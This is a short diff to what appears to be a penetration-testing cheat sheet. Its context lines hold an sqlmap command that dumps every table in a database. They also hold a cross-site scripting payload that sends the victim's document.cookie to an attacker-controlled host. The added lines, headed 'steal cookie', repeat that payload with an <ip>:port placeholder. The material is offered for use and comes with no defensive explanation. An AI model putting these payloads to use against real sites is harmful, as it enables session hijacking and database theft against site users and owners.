@@ -62,4 +62,8 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
 webup
 <script>window.location='http://$IP:80/?cookie=' + document.cookie</script>
 ```
-
+##### steal cookie
+```
+webup
+<script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>
+```
